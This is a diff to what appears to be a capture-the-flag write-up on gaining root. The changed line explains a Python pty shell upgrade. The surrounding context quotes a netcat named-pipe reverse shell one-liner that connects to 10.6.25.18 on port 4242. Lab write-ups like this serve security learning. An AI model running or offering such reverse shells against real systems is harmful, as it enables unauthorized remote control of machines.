@@ -50,7 +50,7 @@ Root user found! Now I have to escalate.
 
 `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.6.25.18 4242 > /tmp/f`
 
-This spawns a terminal so that I can login to root:
+This spawns a terminal so that I can login to root. It is available because Python is enabled.
 
 `python -c 'import pty; pty.spawn("/bin/sh")'`
 
